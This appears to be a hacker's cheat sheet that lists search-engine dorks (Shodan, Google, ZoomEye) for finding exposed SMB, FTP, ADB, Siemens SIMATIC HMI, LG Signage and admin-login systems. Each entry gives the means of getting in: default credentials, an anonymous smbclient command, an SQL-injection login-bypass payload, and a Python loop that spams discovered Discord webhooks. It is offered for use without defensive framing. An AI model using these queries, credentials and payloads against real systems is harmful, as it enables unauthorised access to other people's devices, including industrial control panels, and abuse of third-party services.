# SMB server misconfiguration

### installing smbclient
Debian: `apt install samba`

Arch: `pacman -S smbclient`

### login in to misconfigurated server
`smbclient -N \\\\{address}\\Users`

### Shodan query
[`port:445 "Authentication: disabled" "Users"`](https://www.shodan.io/search?query=port%3A445+%22Authentication%3A+disabled%22+%22Users%22)

# Algo hardcoded password

### Login
Default password: _`algo`_

### Shodan query
[`http.favicon.hash:-1024590169`](https://www.shodan.io/search?query=http.favicon.hash%3A-1024590169)

# SIMATIC HMI_Panel default credentials

### Login
Default username: _`Administrator`_

Default password: _`100`_

### Google dork
[`intitle:”Miniweb Start Page”`](https://www.google.com/search?q=intitle%3A%E2%80%9DMiniweb+Start+Page%E2%80%9D)

# Admin-login panels vulnerable to SQLi
Payload: _`1'or'1'=1'`_

### Google dork
[`intitle:"Admin login" inurl:/admin/index.php`](https://www.google.com/search?q=intitle%3A%22Admin+login%22+inurl%3A%2Fadmin%2Findex.php)

# Find exposed discord webhooks

Simplest way to spam into a webhook in python:
```py
while True: __import__("requests").post("<webhook>", data={"content":"@here hey"})
```

### Zoomeye dork
[`"https://discord.com/api/webhooks/"`](https://www.zoomeye.org/searchResult?q=%22https%5C%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F%22)

#### But... Can i automate this?
The answer is obviously yes, i made [this](https://github.com/komodoooo/discord-stuff/blob/main/src/zw.py) script.

# FTP servers with anonymous login allowed 
Username: _`anonymous`_

Password: _`guest`_

### Shodan query
[`port:21 "Login successful" "FTP server ready"`](https://www.shodan.io/search?query=port%3A21+%22Login+successful%22+%22FTP+server+ready%22)

[`port:21 "Login successful"`](https://www.shodan.io/search?query=port%3A21+%22Login+successful%22)
## Find exposed ftp servers on google
### Google dork
[`intitle:"index of" inurl:ftp`](https://www.google.com/search?q=intitle%3A%22index+of%22+inurl%3Aftp)

# LG Signage default credentials
### Login
Default password: _`00000000`_
### Zoomeye dork
[`iconhash:79487298 && title:"LG Signage"`](https://www.zoomeye.org/searchResult?q=iconhash%3A79487298%20title%3A%22LG%20Signage%22&t=all)

# Android debug bridge misconfiguration
### installing ADB
Debian: `apt install android-tools`
Arch: `pacman -S android-tools`

### Connect to ADB device
**Use [this bash script](https://github.com/komodoooo/Some-things/blob/main/adb/adb.sh)** or connect manually

### Shodan query
[`"Android debug bridge (ADB)" -Authentication`](https://www.shodan.io/search?query=%22Android+debug+bridge+%28ADB%29%22+-Authentication)
